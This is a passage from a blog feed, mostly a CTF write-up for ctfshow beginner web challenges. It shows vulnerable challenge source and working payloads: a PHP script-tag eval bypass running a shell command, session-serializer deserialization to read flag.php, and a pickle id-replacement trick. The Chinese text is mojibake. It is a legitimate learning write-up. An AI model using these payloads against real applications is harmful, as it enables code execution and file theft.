·å½“å¹¿æ’­è€…å’Œæ¥å—è€…éƒ½æœ‰äº†å¯¹æ–¹çš„èº«ä»½ä¿¡æ¯æ—¶ï¼Œå³è¡¨ç¤ºåŒæ–¹è¿æ¥æˆåŠŸï¼ŒAã€Bè¿›å…¥è¿æ¥æ€ã€‚<br>æ‰‹æœºAï¼šStandbyâ€”-&gt;Scanningâ€”-&gt;Initiatingâ€”-&gt;Connection</p><p>åä¸ºæ‰‹ç¯Bï¼šStandbyâ€”-&gt;Advertisingâ€”-&gt;Connection</p><p>æ­¤æ—¶æˆ‘ä»¬æŠŠæ‰‹æœºAç§°ä¸ºä¸»æœºï¼Œåä¸ºæ‰‹ç¯Bç§°ä¸ºä»æœºã€‚</p><h3 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h3><p>1.<a href="https://www.cnblogs.com/iini/p/12334646.html">https://www.cnblogs.com/iini/p/12334646.html</a></p><p>2.<a href="http://www.javashuo.com/article/p-ajgbndml-nv.html">http://www.javashuo.com/article/p-ajgbndml-nv.html</a></p><p>3.<a href="https://blog.csdn.net/linan101/article/details/110478851">https://blog.csdn.net/linan101/article/details/110478851</a></p><p>4.<a href="https://blog.csdn.net/m0_37621078/article/details/107697019">https://blog.csdn.net/m0_37621078/article/details/107697019</a></p><p>5.<a href="https://www.cnblogs.com/ethan-yan/p/14681938.html">https://www.cnblogs.com/ethan-yan/p/14681938.html</a></p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BLE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowæ–°æ‰‹æ¯ éƒ¨åˆ†WP</title>
      <link href="/2022/10/05/ctfshow-xin-shou-bei-bu-fen-wp/"/>
      <url>/2022/10/05/ctfshow-xin-shou-bei-bu-fen-wp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æˆ‘ç¡®å®æ˜¯æ–°æ‰‹ã€‚</p></blockquote><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="easy-eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"?>"</span><span class="token punctuation">.</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//ä¸­æ­¢</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>?&gt;æå‰ä¸­æ­¢phpï¼Œåé¢å°±ä¸ä¼šæ‰§è¡Œä»£ç äº†ã€‚å› æ­¤$codeéœ€è¦ä¼ ä¸€ä¸ªphpæ ‡ç­¾ï¼Œä½†str_replaceè¿‡æ»¤äº†é—®å·ã€‚è€ƒè™‘ç”¨scripté£æ ¼æ ‡ç­¾ã€‚ä¸€å¼€å§‹æ²¡æƒ³åˆ°scripté£æ ¼æ ‡ç­¾å¯¼è‡´å¡äº†å¾ˆä¹…555ã€‚</p><p>payload:</p><pre class="line-numbers language-javascript"><code class="language-javascript">code<span class="token operator">=</span><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat /f1agaaa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005221523758.png" alt="image-20221005221523758" style="zoom:50%;" /><h4 id="å‰ªåˆ€çŸ³å¤´å¸ƒ"><a href="#å‰ªåˆ€çŸ³å¤´å¸ƒ" class="headerlink" title="å‰ªåˆ€çŸ³å¤´å¸ƒ"></a>å‰ªåˆ€çŸ³å¤´å¸ƒ</h4><p>è¿ç»­çŒœæ‹³èµ¢100æ¬¡å¾—åˆ°flagï¼ˆè€ä½ çš„</p><p>å®¡è®¡ä»£ç ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$play</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span> <span class="token operator">=</span> <span class="token string">'/tmp/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.log'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//ç•¥</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;h5>Game History&lt;/h5>\n"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;div class='all_output'>\n"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/div>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token delimiter">&lt;?php</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span>    <span class="token delimiter">&lt;?php</span>    <span class="token variable">$choices</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"Rock"</span><span class="token punctuation">,</span> <span class="token string">"Paper"</span><span class="token punctuation">,</span> <span class="token string">"Scissors"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$rand_bot</span> <span class="token operator">=</span> <span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token variable">$choices</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bot_input</span> <span class="token operator">=</span> <span class="token variable">$choices</span><span class="token punctuation">[</span><span class="token variable">$rand_bot</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">AND</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$choices</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$user_input</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"choice"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$Game</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">play</span><span class="token punctuation">(</span><span class="token variable">$user_input</span><span class="token punctuation">,</span><span class="token variable">$bot_input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">==</span><span class="token string">"You Win"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token delimiter">?></span>        <span class="token comment" spellcheck="true">//...</span>        <span class="token delimiter">&lt;?php</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;div>You need to win 100 rounds in a row to get flag.&lt;/div>"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"Here is your flag:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆåˆ»æ„çš„æŒ‡å‡ºäº†ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™);åºåˆ—åŒ–handlerå¯æ§ï¼Œå¹¶ä¸”å‘ç°<strong>session.upload_progress.name</strong>ä¸ºPHP_SESSION_UPLOAD_PROGRESSï¼Œå¾ˆæ˜æ˜¾çš„phpsessionå·®å¼‚å¯¼è‡´çš„ååºåˆ—åŒ–ã€‚</p><p>phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹<code>session.save_handler</code>æ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚</p><p>å¦‚æœåœ¨PHPåœ¨ååºåˆ—åŒ–å­˜å‚¨çš„$_SESSIONæ•°æ®æ—¶ä½¿ç”¨çš„å¼•æ“å’Œåºåˆ—åŒ–ä½¿ç”¨çš„å¼•æ“ä¸ä¸€æ ·ï¼Œä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚</p><p>è¿™æ˜¯å› ä¸ºå½“ä½¿ç”¨phpå¼•æ“çš„æ—¶å€™ï¼Œphpå¼•æ“ä¼šä»¥**|**ä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦ã€‚</p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">ä»¥ä¸Šå†…å®¹èŠ‚é€‰è‡ªspoockå¸ˆå‚…</a>.</p><p>ä»¥è¿™é“é¢˜ä¸ºä¾‹ã€‚</p><p>ç”±äºsession.upload_progress.nameä¸ºPHP_SESSION_UPLOAD_PROGRESSï¼Œé‚£ä¹ˆè¯¥sessionæ–‡ä»¶çš„å†…å®¹æ˜¯å¯æ§çš„ï¼Œå°±æ˜¯POSTçš„filenameã€‚</p><p>ä¸Šä¼ é¡µé¢ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://a188d7a8-2a27-4c8f-bdb0-da187c09c567.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“åˆGameç±»çš„ä»£ç ï¼Œæˆ‘ä»¬æŠŠlogè®¾ç½®ä¸ºflag.phpå³å¯ï¼Œåºåˆ—åŒ–ç”Ÿæˆï¼š</p><p>O:4:&quot;Game&quot;:2:{s:3:&quot;log&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;name&quot;;s:8:&quot;Squirt1e&quot;;}</p><p>filenameèµ‹å€¼ä¸º|O:4:&quot;Game&quot;:2:{s:3:&quot;log&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;name&quot;;s:8:&quot;Squirt1e&quot;;}ã€‚ã€phpå¼•æ“ä¼šä»¥**|**ä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦</p><p>ä¹Ÿå°±æ˜¯â€™s:6:&quot;Squirt1eâ€;s:67:â€â€˜&#x3D;&gt;â€™O:4:&quot;Game&quot;:2:{s:3:&quot;log&quot;;s:8:&quot;flag.php&quot;;s:4:&quot;name&quot;;s:8:&quot;Squirt1e&quot;;}â€™ï¼Œä»è€Œåœ¨ææ„å‡½æ•°è¯»å–flagã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005224014534.png" alt="image-20221005224014534" style="zoom: 33%;" /><h4 id="baby-pickle"><a href="#baby-pickle" class="headerlink" title="baby_pickle"></a>baby_pickle</h4><pre class="line-numbers language-python"><code class="language-python">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>id <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow{"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"}"</span><span class="token keyword">class</span> <span class="token class-name">Rookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>id <span class="token operator">=</span> id@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">agent_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> id    id <span class="token operator">=</span> id <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> <span class="token string">"new_rookie"</span>    new_rookie <span class="token operator">=</span> Rookie<span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        file <span class="token operator">=</span> open<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>        info <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>new_rookie<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        info <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>info<span class="token punctuation">)</span>        file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>        file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"error"</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>        user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>file<span class="token punctuation">)</span>    message <span class="token operator">=</span> user<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"&lt;/h1>\n&lt;p>"</span> <span class="token operator">+</span> <span class="token string">"åªæœ‰æˆä¸ºå¤§èœé¸¡æ‰èƒ½å¾—åˆ°flag"</span>    <span class="token keyword">return</span> message@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/dacaiji"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">if</span> user<span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token string">"ä½ ä¸æ˜¯å¤§èœé¸¡"</span>        <span class="token keyword">return</span> message    <span class="token keyword">else</span><span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token string">"æ­å–œä½ æˆä¸ºå¤§èœé¸¡"</span> <span class="token operator">+</span> flag        <span class="token keyword">return</span> message@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/change"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    newname <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"newname"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    file <span class="token operator">=</span> open<span class="token punctuation">(</span>name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"old_info ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"name ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"newname ===================="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>newname<span class="token punctuation">)</span>    info <span class="token operator">=</span> info<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>name<span class="token punctuation">,</span> newname<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token operator">*</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span>    file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">"_info"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éé¢„æœŸäº†ã€‚pickleååºåˆ—åŒ–ã€‚ç„¶åæ³¨æ„åˆ°äº†info &#x3D; info.replace(name, newname)ï¼Œåªè¦è®©user.id&#x3D;0å³å¯ï¼Œå‡è®¾ç¬¬ä¸€æ¬¡é»˜è®¤è·¯ç”±è®©id&#x3D;1ï¼Œé‚£ä¹ˆæ³¨å†Œä¸€ä¸ªname&#x3D;2çš„ç”¨æˆ·ï¼Œç„¶åé€šè¿‡&#x2F;changeæ”¹æˆ0å³å¯æ›¿æ¢æ‰user.idã€‚</p><p>æ³¨å†Œç”¨æˆ·2ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225054520.png" alt="image-20221005225054520" style="zoom:50%;" /><p>ä¿®æ”¹ç”¨æˆ·åï¼Œæ³¨æ„baseç¼–ç ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225158916.png" alt="image-20221005225158916" style="zoom:50%;" /><p>è®¿é—®&#x2F;dacaijiï¼Œè¿™é‡Œæ²¡æƒ³æ˜ç™½ä¸ºå•¥nameæ²¡è¢«æ›¿æ¢æˆ0ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20221005225223114.png" alt="image-20221005225223114" style="zoom:50%;" /><h4 id="repairman"><a href="#repairman" class="headerlink" title="repairman"></a>repairman</h4><p>hello,the user!We may change the mode to repaie the server,please keep it unchanged</p><p>è®©mode&#x3D;0ï¼Œçœ‹åˆ°äº†ä»£ç ã€‚</p><pre class="line-numbers language-php"><code class="language-php">Your mode is the guest<span class="token operator">!</span>hello<span class="token punctuation">,</span>the repairman<span class="token operator">!</span> <span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token 